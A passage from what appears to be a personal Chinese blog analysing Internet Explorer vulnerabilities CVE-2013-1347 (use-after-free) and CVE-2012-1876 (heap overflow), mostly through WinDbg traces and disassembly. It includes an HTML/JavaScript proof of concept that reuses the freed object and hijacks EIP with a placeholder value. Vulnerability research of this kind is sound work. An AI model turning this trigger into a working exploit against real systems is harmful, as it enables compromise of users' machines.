ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429b2 esp=0448acec ebp=0448acfc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0x3:682429b2 8bec mov ebp,esp0:005&gt; eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429b4 esp=0448acec ebp=0448acec iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0x5:682429b4 56 push esi0:005&gt; peax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429b5 esp=0448ace8 ebp=0448acec iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0x6:682429b5 8bf0 mov esi,eax0:005&gt; peax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429b7 esp=0448ace8 ebp=0448acec iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0x8:682429b7 e872330400 call mshtml!ISpanQualifier::IsTreeNodeQualifier (68285d2e)0:005&gt; peax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429bc esp=0448ace8 ebp=0448acec iopl=0 nv up ei ng nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286mshtml!ISpanQualifier::GetFancyFormat+0xd:682429bc 84c0 test al,al0:005&gt; eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429be esp=0448ace8 ebp=0448acec iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0xf:682429be 0f849e5d2300 je mshtml!ISpanQualifier::GetFancyFormat+0x1a (68478762) [br=0]0:005&gt; eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429c4 esp=0448ace8 ebp=0448acec iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0x11:682429c4 8bce mov ecx,esi0:005&gt; eax=00000001 ebx=059d3fa0 ecx=06ad8fb0 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429c6 esp=0448ace8 ebp=0448acec iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0x13:682429c6 e84e881600 call mshtml!CTreeNode::GetFancyFormat (683ab219)0:005&gt; ln poi(poi(06ad8fb0))(682a8fd8) mshtml!CSpanElement::`vftable&apos; | (681b73d8) mshtml!CBlockElement::`vftable&apos;Exact matches: mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt; 继续回溯 mshtml!SLayoutRun::HasInlineMbp 函数。继续回溯到函数 mshtml!SRunPointer::HasInlineMbp,在调用 SLayoutRun::HasInlineMbp 函数之前也调用了 SRunPointer::SpanQualifier(void)。如下图跟进函数 SRunPointer::SpanQualifier(void) 发现其主要功能是 eax= [[eax+4]+c],现在的 eax 即为 CTreeNode 的地址。下面通过 windbg 调试看下在崩溃前 eax+4 地址处内存。如下123456789101112131415161718192021222324252627282930&apos;=====eax+4=====&apos;0481cec8 07516fd0 00000000 06f58fc8 0481cf0c0481ced8 685b4b64 0481cef3 00000000 000000000481cee8 0481d018 68625be8 0000cf04 000000000481cef8 00000031 0481cf73 687406bf 0481cf580481cf08 685ecc7b 0481cf58 687fe223 0481cf770481cf18 0481cf8b 07e30ff0 0481d048 000000020481cf28 05520fd8 00000000 0481cf8b 06f58f000481cf38 0481d001 05e51fd8 00000000 05520fd8(ddc.b50): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=68a89100 ebx=06faafb0 ecx=078cefc8 edx=00000000 esi=0481cba8 edi=00000000eip=6870b68d esp=0481cb7c ebp=0481cb94 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246mshtml!CElement::Doc:6870b68d 8b01 mov eax,dword ptr [ecx] ds:0023:078cefc8=????????0:005&gt; dd 07516fd0 LC07516fd0 00000805 00000002 06faafc0 06faafb007516fe0 00000806 00000003 06faafd8 06faafb007516ff0 00000806 00000004 05e51fd8 05e51fb00:005&gt; dd 07516fc0 L1007516fc0 00000805 00000001 05e51fc0 05e51fb007516fd0 00000805 00000002 06faafc0 06faafb007516fe0 00000806 00000003 06faafd8 06faafb007516ff0 00000806 00000004 05e51fd8 05e51fb00:005&gt; ln poi(poi(05e51fb0))(68648fd8) mshtml!CSpanElement::`vftable&apos; | (685573d8) mshtml!CBlockElement::`vftable&apos;Exact matches: mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt; 如上，eax+4 指向一个结构体数组，还原结构体的大概如下1234567struct elememt_arry&#123; int unkown; int id; int CTreePos; int CTreeNode;&#125;; 下面通过栈回溯去查看这个数组所占内存的来源。123456789101112131415161718192021222324252627282930313233343536370:005&gt; !heap -p -a 07516fc0 address 07516fc0 found in _DPH_HEAP_ROOT @ 51000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 75105e4: 7516fc0 40 - 7516000 2000 6cba8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 77235e26 ntdll!RtlDebugAllocateHeap+0x00000030 771fa376 ntdll!RtlpAllocateHeap+0x000000c4 771c5ae0 ntdll!RtlAllocateHeap+0x0000023a 6870d7d0 mshtml!_HeapRealloc+0x00000036 687234e2 mshtml!CImplAry::EnsureSizeWorker+0x000000a1 686c9b04 mshtml!CImplAry::AppendIndirect+0x00000027 68609ad9 mshtml!CTextBlock::AddAtomRun+0x00000105 68612b04 mshtml!CTextBlock::BuildSpanBeginRun+0x000000c4 68603e11 mshtml!CTextBlock::BuildTextBlock+0x00000aeb 68603488 mshtml!CLayoutBlock::BuildBlock+0x000001ec 685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d 685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1 685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d 685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1 685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d 685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1 685f1290 mshtml!CCssDocumentLayout::GetPage+0x0000022a 685f2176 mshtml!CCssPageLayout::CalcSizeVirtual+0x00000254 6875566c mshtml!CLayout::CalcSize+0x000002b8 68765c6b mshtml!CLayout::DoLayout+0x0000011d 686293f1 mshtml!CCssPageLayout::Notify+0x00000140 6871e667 mshtml!NotifyElement+0x00000041 6872c76b mshtml!NotifyAncestors+0x000001b7 6871214b mshtml!CMarkup::SendNotification+0x00000092 687120be mshtml!CMarkup::Notify+0x000000d6 6875c083 mshtml!CElement::SendNotification+0x0000004a 6879574e mshtml!CElement::EnsureRecalcNotify+0x0000015f 68581242 mshtml!CElement::GetOffsetParentHelper+0x00000060 6865d442 mshtml!CElement::get_offsetParent+0x00000030 6878bb55 mshtml!G_IDispatchp+0x0000007b 68635ea6 mshtml!CBase::ContextInvokeEx+0x000002d0 下面看泉哥说的数组是在创建CTextBlock时生成的，CTreeNode+0x44保存的是结构 CTextBlock的地址，CTextBlock+0x58 存储的时数组地址(偷下懒)。下面都是参考的 exp-sky 前辈的 CVE-2013-1347 Microsoft Internet Explorer CGenericElement Object Use After Free Vulnerability Analysis。（自己好弱 通过对比分析发现当 javascript 代码块中存在修改 DOM 树的代码时，并且存在未被渲染的DOM元素时（新创建的 DOM 元素）如果调用了 offsetParent 代码（可根据任意元素来引用）。将导致未被渲染过的元素属性被修改为已渲染。这样在修改其 DOM 节点时(如通过 innerHTML 属性来释放其所有子元素)也不会通过CtreeNode::ComputeFormats 函数重新计算节点格式。导致浏览器并不知道元素释放情况，也未更新元素节点关系。正常的处理流程是，当通过 innerHTML 释放了未被渲染的元素的所有子元素后。其会通过以下流程的函数调用最终调用到 CtreeNode::ComputeFormats 函数对 CTreeNode节点进行重新计算。12345678910GS_PropEnum |- CElement::put_innerHTML |- Celement::InjectCompatBSTR |- CElement_InjectInternal |- CtreeNode::IsEditable |- CtreeNode::GetCharFormat ⇐ 判断属性 |- CtreeNode::GetCHarFormatHelper |- CtreeNode::GetCharFormatIndexHelper |- CtreeNode::ComputeFormatsHelper |- CtreeNode::ComputeFormats CtreeNode::GetCharFormat 会判断 CTreeNode 的属性，即偏移 0xc 处的引用计数值，当引用计数值大于0时，表示已经渲染，无需重新计算 CTreeNode，因此则不进入 CtreeNode::GetCHarFormatHelper 函数也无法调用到其后续函数 CtreeNode::ComputeFormats 对 CTreeNode 进行重新计算。这种情况下处理流程如下123456GS_PropEnum |- CElement::put_innerHTML |- Celement::InjectCompatBSTR |- CElement_InjectInternal |- CtreeNode::IsEditable |- CtreeNode::GetCharFormat ⇐ 判断属性 在 javascript 执行完成后，浏览器会重新渲染 DOM 树，因为之前并没有去重新计算CGenericElement 的 CTreeNode 节点，导致了浏览器仍然企图渲染释放后的元素。最终引用了释放后的元素，成功利用后可以导致任意代码执行。 exploit分析 发现泉哥书里还是由很多错误的，比如再分析这个的时候p315说 CTreeNode被清除，还有p325 页CGenericElement的对象大小应为 0x38。利用 t:ANIMATECOLOR 来重用被释放的对象，尝试控制 eip。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;!doctype html&gt;&lt;HTML XMLNS:t ="urn:schemas-microsoft-com:time"&gt;&lt;head&gt;&lt;meta&gt; &lt;?IMPORT namespace="t" implementation="#default#time2"&gt;&lt;/meta&gt;&lt;script&gt;function helloWorld()&#123; animvalues = ""; // mshtml!CElement::Doc: // 6586c815 8b01 mov eax,dword ptr [ecx] // 6586c817 8b5070 mov edx,dword ptr [eax+70h] // 6586c81a ffd2 call edx for (i=0; i &lt;= 0x70/4; i++) &#123; // t:ANIMATECOLOR 标签第一个对象用于覆盖虚表指针 // 由于索引虚函数时，需要偏移0x70，所以这里采用0x70/4去精确控制edx值 if (i == 0x70/4) &#123; //animvalues += unescape("%u5ed5%u77c1"); animvalues += unescape("%u4141%u4141"); // 控制edx=0x41414141 &#125; else &#123; animvalues += unescape("%u4242%u4242"); // 0x42424242 &#125; &#125; for(i = 0; i &lt; 13; i++) &#123; // t:ANIMATECOLOR 标签值是一个用分号分隔的字符串，分号的个数决定对象的大小， // 对象的每个元素都是一个指针，指向分号分隔出来的字符串 // 漏洞对象CGnericElement大小0x38，所以这里需要包含0x38/4=13个分号 14个字符串 animvalues += ";red"; &#125; f0 = document.createElement('span'); document.body.appendChild(f0); f1 = document.createElement('span'); document.body.appendChild(f1); f2 = document.createElement('span'); document.body.appendChild(f2); document.body.contentEditable="true"; f2.appendChild(document.createElement('datalist')); f1.appendChild(document.createElement('span')); f1.appendChild(document.createElement('table')); try&#123; f0.offsetParent=null; &#125;catch(e) &#123;&#125; f2.innerHTML=""; f0.appendChild(document.createElement('hr')); f1.innerHTML=""; CollectGarbage(); try &#123; //使用 t:ANIMATECOLOR 标签可以自由设置其内容，控制对象大小 a = document.getElementById('myanim'); a.values = animvalues; &#125; catch(e) &#123;&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload="eval(helloWorld());"&gt;&lt;t:ANIMATECOLOR id="myanim"/&gt;&lt;/body&gt;&lt;/html&gt; 可以看到已经成功劫持了 eip，下面就是 rop 的构造啦，具体的可以参考msf提供的脚本。]]></content>
      <tags>
        <tag>old_blog</tag>
        <tag>browser</tag>
        <tag>vuln</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2012-1876]]></title>
    <url>%2F2019%2F01%2F09%2FCVE-2012-1876%2F</url>
    <content type="text"><![CDATA[从备份失败的老博客还原出来的 poc分析开启 hpa 后打开 poc, windbg 附加进行进程，查看崩溃原因。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657580:013&gt; .childdbg 1Processes created by the current process will be debugged0:013&gt; gModLoad: 6c020000 6c0d2000 C:\Windows\System32\jscript.dll(854.5fc): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=07ddf000 edi=07ddf018eip=68980a2f esp=0462b9c8 ebp=0462b9d4 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206mshtml!CTableColCalc::AdjustForCol+0x15:68980a2f 890f mov dword ptr [edi],ecx ds:0023:07ddf018=????????0:005&gt; kbChildEBP RetAddr Args to Child 0462b9d4 687ef47a 00414114 0462bd20 00000001 mshtml!CTableColCalc::AdjustForCol+0x150462ba8c 6865a6b8 00000001 0462bd20 000003e8 mshtml!CTableLayout::CalculateMinMax+0x5580462bca8 68650879 0462bd20 0462bcec 00000001 mshtml!CTableLayout::CalculateLayout+0x2760462be54 6875566c 0462d4c8 0462c080 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x7200462bf8c 687518f9 07d9aea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b80462c050 68751646 07d9aea8 00013628 00013628 mshtml!CFlowLayout::MeasureSite+0x3120462c098 687519c1 07724f00 00000061 0462d4c8 mshtml!CFlowLayout::GetSiteWidth+0x1560462c0d8 68751f70 05568fb0 07d9aea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce0462c15c 6e17665d 07654ff8 0462c17c 0462c240 mshtml!CEmbeddedILSObj::Fmt+0x1500462c1ec 6e176399 0763cefc 00000000 07640d20 msls31!ProcessOneRun+0x3e90462c248 6e176252 0763cf18 00013fe0 00000000 msls31!FetchAppendEscCore+0x18e0462c29c 6e1761c3 00000000 00000000 00000014 msls31!LsDestroyLine+0x47f0462c324 6e17293f 00000007 00002e87 00000000 msls31!LsDestroyLine+0x9ff0462c360 6874f95e 00000001 00000007 00002e87 msls31!LsCreateLine+0xcb0462c4b0 68760d1e 0462d4c8 00000007 05568fc0 mshtml!CLSMeasurer::LSDoCreateLine+0x1270462c554 68761367 0462cdb8 00013628 00000000 mshtml!CLSMeasurer::LSMeasure+0x340462c59c 68761223 00000000 00013df8 00000083 mshtml!CLSMeasurer::Measure+0x1e60462c5c0 68762d7e 00013df8 00000083 07724f40 mshtml!CLSMeasurer::MeasureLine+0x1c0462c670 6876b89e 0462cb90 077b8fd8 00000083 mshtml!CRecalcLinePtr::MeasureLine+0x46d0462ce78 6876b1f1 0462d4c8 00000007 0000000e mshtml!CDisplay::RecalcLines+0x8bb0462cfc8 6876b034 0462d4c8 00000007 0000000e mshtml!CDisplay::UpdateView+0x2080462d07c 6876af8b 0462d4c8 0462d600 06f55f10 mshtml!CFlowLayout::CommitChanges+0x9c0462d18c 6864a711 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcTextSize+0x30f0462d414 6875adf6 07724f00 0462d600 00000000 mshtml!CFlowLayout::CalcSizeCoreCompat+0x10450462d430 68763651 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcSizeCore+0x490462d46c 6875ada4 0462d4c8 0462d600 00000000 mshtml!CBodyLayout::CalcSizeCore+0xd80462d4a4 6875566c 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcSizeVirtual+0x1af0462d5dc 686f82bd 07724f00 00000001 00000000 mshtml!CLayout::CalcSize+0x2b80462d6cc 68765964 00100000 00000007 069eaeb4 mshtml!CFlowLayout::DoLayout+0x5430462d708 68748bd8 069ea870 00100000 0462d768 mshtml!CView::ExecuteLayoutTasks+0x3b0462d74c 686d3acd 00000000 0462d79c 0000003e mshtml!CView::EnsureView+0x3550462d774 687293c2 069ea870 00000000 06888d58 mshtml!CView::EnsureViewCallback+0xd30462d7a8 6871e012 0462d844 00008002 00000000 mshtml!GlobalWndOnMethodCall+0xff0462d7c8 75dfc4e7 00040276 00000012 00000000 mshtml!GlobalWndProc+0x10c0462d7f4 75dfc5e7 68706853 00040276 00008002 USER32!InternalCallWinProc+0x230462d86c 75dfcc19 00000000 68706853 00040276 USER32!UserCallWinProcCheckWow+0x14b0462d8cc 75dfcc70 68706853 00000000 0462f9ec USER32!DispatchMessageWorker+0x35e0462d8dc 6cd94bec 0462d904 00000000 017aef58 USER32!DispatchMessageW+0xf0462f9ec 6cda4f62 047adfe0 00000000 0168aff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54b0462faa4 75775c2b 017aef58 00000000 0462fac0 IEFRAME!LCIETab_ThreadProc+0x2c10462fab4 76023c45 0168aff0 0462fb00 771d37f5 iertutil!CIsoScope::RegisterThread+0xab0462fac0 771d37f5 0168aff0 71861b5a 00000000 kernel32!BaseThreadInitThunk+0xe0462fb00 771d37c8 75775c1d 0168aff0 00000000 ntdll!__RtlUserThreadStart+0x700462fb18 00000000 75775c1d 0168aff0 00000000 ntdll!_RtlUserThreadStart+0x1b 然后看下 edi 指向的内存信息。由上面的调试信息可知发生了堆溢出。 漏洞成因下面来看下造成崩溃的 edi 来自哪里，先从崩溃的函数分析。12345678910111213141516170:005&gt; uf mshtml!CTableColCalc::AdjustForColmshtml!CTableColCalc::AdjustForCol:68980a1a 8bff mov edi,edi68980a1c 55 push ebp68980a1d 8bec mov ebp,esp68980a1f 8b08 mov ecx,dword ptr [eax]68980a21 53 push ebx68980a22 8b5d08 mov ebx,dword ptr [ebp+8]68980a25 57 push edi68980a26 8bc1 mov eax,ecx68980a28 83e00f and eax,0Fh68980a2b 8d7e18 lea edi,[esi+18h]68980a2e 50 push eax68980a2f 890f mov dword ptr [edi],ecx68980a31 e8d3c3daff call mshtml!CUnitValue::IsScalerUnit (6872ce09)68980a36 85c0 test eax,eax... 如上，edi=esi+18h，但是这个函数并没有对 esi 的处理，猜测在上一层函数。即函数 mshtml!CTableLayout::CalculateMinMax。根据 ida 的代码交叉引用功能可以找打调用 CTableColCalc::AdjustForCol 地址。 回溯发现静态分析是没法得到具体信息的，在函数 mshtml!CTableLayout::CalculateMinMax 下断进行调试。1234567891011121314151617181920212223242526272829303132333435363738394041420:013&gt; .childdbg 1Processes created by the current process will be debugged0:013&gt; bu mshtml!CTableLayout::CalculateMinMax0:013&gt; bl 0 e 69dba078 0001 (0001) 0:**** mshtml!CTableLayout::CalculateMinMax0:013&gt; gModLoad: 6c6e0000 6c792000 C:\Windows\System32\jscript.dllBreakpoint 0 hiteax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85ceip=69dba078 esp=0466c600 ebp=0466c818 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax:69dba078 8bff mov edi,edi0:005&gt; p...0:005&gt; eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85ceip=69dba084 esp=0466c560 ebp=0466c5fc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xc:69dba084 8b5d08 mov ebx,dword ptr [ebp+8] ss:0023:0466c604=07c52ea80:005&gt; eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85ceip=69dba087 esp=0466c560 ebp=0466c5fc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xf:69dba087 56 push esi0:005&gt; ln poi(ebx)(69cb9960) mshtml!CTableLayout::`vftable&apos; | (69cb9aa0) mshtml!CTableLayoutBlock::`vftable&apos;Exact matches: mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;...0:005&gt; eax=00000000 ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=0466c890 edi=0466c85ceip=69dba094 esp=0466c55c ebp=0466c5fc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1c:69dba094 8b4354 mov eax,dword ptr [ebx+54h] ds:0023:07c52efc=00000001...0:005&gt; dd ebx+0x54 L107c52efc 00000001 由调试信息可以猜到这个是在 table 元素建立过程中，ebx+54h 存储的值为1，并且在 poc 中 span= 1，两者之间有什么关系呢，下面我们在 poc 中增加一行，如下 继续动态调试可以看到123456780:005&gt; eax=00000000 ebx=07af5ea8 ecx=00412802 edx=ffffffff esi=045ac7a0 edi=045ac76ceip=6809a094 esp=045ac46c ebp=045ac50c iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableLayout::CalculateMinMax+0x1c:6809a094 8b4354 mov eax,dword ptr [ebx+54h] ds:0023:07af5efc=0000000a0:005&gt; dd ebx+0x54 L107af5efc 0000000a 如上我们可以猜测 CTableLayout 对象偏移 0x54 处存储的是 table 标签里 span 元素的总和。在看了 kk 前辈的分析后，发现偏移 0x84 处存储的是是一个数组 TableElementArray，数组成员为 &lt;table&gt; 标签的中的元素在内存中的对象。调试信息如下，至于为什么两个 col 元素但是实际内存中两个后面还有重复的我也不知道12345678910111213141516170:005&gt; dd poi(ebx+84)0703efd8 06be8fd0 0712afd0 0712afd0 0712afd00703efe8 0712afd0 0712afd0 0712afd0 0712afd00703eff8 0712afd0 0712afd0 ???????? ????????0703f008 ???????? ???????? ???????? ????????0703f018 ???????? ???????? ???????? ????????0703f028 ???????? ???????? ???????? ????????0703f038 ???????? ???????? ???????? ????????0703f048 ???????? ???????? ???????? ????????0:005&gt; ln poi(06be8fd0)(6801a1d0) mshtml!CTableCol::`vftable&apos; | (67f96b18) mshtml!CTableSection::`vftable&apos;Exact matches: mshtml!CTableCol::`vftable&apos; = &lt;no type information&gt;0:005&gt; ln poi(0712afd0)(6801a1d0) mshtml!CTableCol::`vftable&apos; | (67f96b18) mshtml!CTableSection::`vftable&apos;Exact matches: mshtml!CTableCol::`vftable&apos; = &lt;no type information&gt; 在CTableCol 的内存中偏移 0xC 字节处，保存着一个 CAttrArray 对象指针 theTableColAttrArray 。在 theTableColAttrArray 对象内存偏移 0xC 字节处，是一块 0x40字节大小的缓冲区 theTableColAttrInfoBuffer,用于保存 &lt;col&gt;元素属性的信息，如下。实际上我们可以先跟踪哪个函数进行了堆的分配。如上，可知函数 mshtml!CImplAry::EnsureSizeWorker 完成了堆的分配，后续调试发现CTableLayout偏移 0x90 处存在一个用来与 span 的值进行比较的数。之后在 mshtml!CTableLayout::CalculateMinMax 函数调用了 mshtml!CImplAry::EnsureSizeWorker。跟进mshtml!CImplAry::EnsureSizeWorker。发现其调用了 ULongLongToUInt。12345678910111213141516int __userpurge ULongLongToUInt@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;, unsigned __int64 a2, unsigned int *a3)&#123; int result; // eax if ( a2 &gt; 0xFFFFFFFF ) &#123; *a1 = -1; result = -2147024362; &#125; else &#123; *a1 = a2; result = 0; &#125; return result;&#125; 可以看到当第一个参数大于0xFFFFFFFF结果为负值，小于为0，现在传入的为 0x70,故函数执行完成后 eax=0。下面是 mshtml!CImplAry::EnsureSizeWorker 这个函数的注释。跟进函数 _HeapRealloc 发现堆分配的地址保存在 CTableLayout 偏移0x9c处。执行完 mshtml!CTableLayout::CalculateMinMax 函数后发现并没有崩溃，所以还存在另一次调用，继续运行。123456789101112131415160:005&gt; eax=ffffffff ebx=0824cea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0468bd54eip=6809a084 esp=0468ba58 ebp=0468baf4 iopl=0 nv up ei pl nz ac pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216mshtml!CTableLayout::CalculateMinMax+0xc:6809a084 8b5d08 mov ebx,dword ptr [ebp+8] ss:0023:0468bafc=0824cea80:005&gt; eax=ffffffff ebx=0824cea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0468bd54eip=6809a087 esp=0468ba58 ebp=0468baf4 iopl=0 nv up ei pl nz ac pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216mshtml!CTableLayout::CalculateMinMax+0xf:6809a087 56 push esi0:005&gt; dd ebx+0x54 L10824cefc 000000010:005&gt; dd ebx+0x94 L10824cf3c 00000004 可以看到和上一次相比 ebx+0x94 处的值变成了4，什么时候变的???好像不知道。在 over_trigger 函数里我们已经把 span 的值改成了 1000,但现在还没有变动，说明下面会改动这个值，设置内存断点，观察什么时候会改动。直接崩溃了，说明并没有对 CTableLayout 的 span 的值做处理。还有在 mshtml!CImplAry::EnsureSizeWorker 下断点并没有停下，说明ebx+0x94的值右移2后和1相等，跳转走了，并没有执行mshtml!CImplAry::EnsureSizeWorker 去分配堆。好像下面没法分析啦，因为崩溃点在 CTableColCalc::AdjustForCol 函数里，所以我们在 mshtml!CTableLayout::CalculateMinMax 调用 CTableColCalc::AdjustForCol 函数前加一个断点，观察参数。实际上并没有直接断在 call 处，为了更清楚的观察，断在了其之前的指令。主要处理指令如下。1234567891011121314151617181920212223242526272829303132333435mshtml!CTableLayout::CalculateMinMax+0x519:6822f43b 8b839c000000 mov eax,dword ptr [ebx+9Ch] ;存放的是开辟的堆的地址6822f441 03c1 add eax,ecx ;堆的地址加上之前已经处理的偏移6822f443 837de400 cmp dword ptr [ebp-1Ch],0 ;相等6822f447 8945d8 mov dword ptr [ebp-28h],eax 6822f44a 741a je mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466) ;跳转mshtml!CTableLayout::CalculateMinMax+0x52a:6822f44c 8b4510 mov eax,dword ptr [ebp+10h]6822f44f 83f801 cmp eax,16822f452 7e12 jle mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466)mshtml!CTableLayout::CalculateMinMax+0x532:6822f454 48 dec eax6822f455 3945ec cmp dword ptr [ebp-14h],eax6822f458 750c jne mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466)mshtml!CTableLayout::CalculateMinMax+0x538:6822f45a 0faf45f4 imul eax,dword ptr [ebp-0Ch]6822f45e 8b4dd0 mov ecx,dword ptr [ebp-30h]6822f461 2bc8 sub ecx,eax6822f463 894df4 mov dword ptr [ebp-0Ch],ecxmshtml!CTableLayout::CalculateMinMax+0x544:6822f466 ff75c0 push dword ptr [ebp-40h]6822f469 8b45cc mov eax,dword ptr [ebp-34h]6822f46c ff750c push dword ptr [ebp+0Ch]6822f46f 8b75d8 mov esi,dword ptr [ebp-28h] ;堆的地址加上之前已经处理过的偏移6822f472 ff75f4 push dword ptr [ebp-0Ch]6822f475 e8a0151900 call mshtml!CTableColCalc::AdjustForCol (683c0a1a)6822f47a ff45ec inc dword ptr [ebp-14h] ;最开始为0 每执行一次AdjustForCol函数会加16822f47d 8b45ec mov eax,dword ptr [ebp-14h]6822f480 8345dc1c add dword ptr [ebp-24h],1Ch ; ebp-24h 存放的是传入AdjustForCol函数的offset最开始为0 每执行一次加1c6822f484 3b4510 cmp eax,dword ptr [ebp+10h] ; ebp+10存放的值为3e8即1000,所以可以发现会循环调用1000次AdjustForCol函数6822f487 7caf jl mshtml!CTableLayout::CalculateMinMax+0x516 (6822f438) 所以现在还剩下 ebp-c 指向的值是什么还不确定，继续设置内存断点，观察 ebp-c 值的变化(好像又失败了???我操作有问题???)。最后发现 ida显示那个值的类型是 struct CWidthUnitValue * ，所以在查看调用的函数后发现可能是调用 CWidthUnitValue::GetPixelWidth 函数的返回值，加断点观察下。跟进函数 CWidthUnitValue::GetPixelWidth。算了，不跟了，跟不动，结果是因为 0x0414114=42765*100。所以来继续分析 AdjustForCol 函数。123456789101112131415161718192021void __userpurge CTableColCalc::AdjustForCol(CTableColCalc *this@&lt;ecx&gt;, const struct CWidthUnitValue **a2@&lt;eax&gt;, const struct CWidthUnitValue **a3@&lt;esi&gt;, const struct CWidthUnitValue *a4, int a5, struct CCalcInfo *a6, int a7)&#123; unsigned int v7; // ST04_4 v7 = (unsigned int)*a2 &amp; 0xF; // (unsigned int)*a2=04141149 a3[6] = *a2; if ( CUnitValue::IsScalerUnit(v7) ) &#123; CUnitValue::SetValue((signed int)a4, (int *)a3 + 6, 8);// a3[6] = a3[6]*16|8 a3[1] = a4; // a3[1]=00414114 *a3 = a4; // *a3 = 00414114 &#125; else &#123; if ( a6 != (struct CCalcInfo *)1 ) CUnitValue::SetPercent((CUnitValue *)0x64, (int)(a3 + 6)); *a3 = (const struct CWidthUnitValue *)1; a3[1] = *(const struct CWidthUnitValue **)(a5 + 16); &#125; a3[2] = a4; // a3[2]=00414114 &#125; 可能不够形象，直接贴图吧。实际上完成的功能可以用下面的伪代码表示(参考KK前辈的)1234567891011121314151617int i= 0;while(i &lt; SpanSum)&#123; CTableCol* theTableColObj = theTableLayoutObj-&gt;TableElementArray[i*4] int col_span = theTableColObj-&gt;GetAAspan(); //获得 col 元素的 span 属性 //判断 col 元素是否设置了 width 属性 if(theTableColObj-&gt;CUnitValue::IsNullOrEnum()) &#123; for(int j=0; j&lt;col_span; j++) &#123; int cur_offset = (i + j) * 0x1C AdjustForCol@CTableColCalc(&amp;ColTableLayoutBuffer[cur_offset],width) 